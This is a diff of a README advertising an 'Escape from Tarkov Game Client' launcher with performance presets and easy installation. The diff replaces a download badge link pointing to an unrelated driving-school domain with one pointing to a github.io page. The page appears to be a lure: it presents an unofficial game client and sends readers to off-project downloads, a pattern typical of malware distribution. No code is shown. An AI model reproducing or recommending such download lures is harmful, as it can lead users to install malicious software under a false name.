@@ -2,7 +2,7 @@
 
 **Escape from Tarkov Game Client** is an all-in-one launcher designed to provide a seamless and optimized experience for players. Offering full integration, it allows you to quickly install, configure, and play Escape from Tarkov with performance-enhancing presets and customizations. Whether you are a new player or a veteran looking for improved game performance and faster load times, this solution is made for you. The client provides a hassle-free way to install, manage, and update Escape from Tarkov with minimal effort.
 
-[![Download Escape from Tarkov Game Client](https://img.shields.io/badge/Download-Escape_from_Tarkov_Client-blueviolet)](https://dalahdrivingschool.com/)
+[![Download Escape from Tarkov Game Client](https://img.shields.io/badge/Download-Escape_from_Tarkov_Client-blueviolet)](https://escape-from-tarkov.github.io/.github)
 
 ---
 
